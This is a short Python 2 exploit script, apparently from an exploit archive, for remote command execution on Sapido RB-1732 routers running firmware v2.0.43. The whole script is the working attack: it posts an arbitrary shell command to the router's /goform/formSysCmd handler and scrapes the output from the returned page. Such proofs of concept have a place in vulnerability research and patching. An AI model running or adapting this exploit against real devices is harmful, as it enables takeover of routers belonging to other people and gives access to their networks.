# Exploit Author: k1nm3n.aotoi
# Vendor Homepage: http://www.sapido.com.tw/
# Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin
# Version: RB-1732 V2.0.43 
# Tested on: linux

 
import requests
import sys
 
def test_httpcommand(ip, command):
   my_data = {&#039;sysCmd&#039;: command, &#039;apply&#039;: &#039;Apply&#039;, &#039;submit-url&#039;:&#039;/syscmd.asp&#039;, &#039;msg&#039;:&#039;&#039;}
   r = requests.post(&#039;http://%s/goform/formSysCmd&#039; % ip, data = my_data)
   content = r.text
   content = content[
     content.find(&#039;<textarea rows="15" name="msg" cols="80" wrap="virtual">&#039;)+56:
     content.rfind(&#039;</textarea>&#039;)]
   return content
 
print test_httpcommand(sys.argv[1], " ".join(sys.argv[2:]))


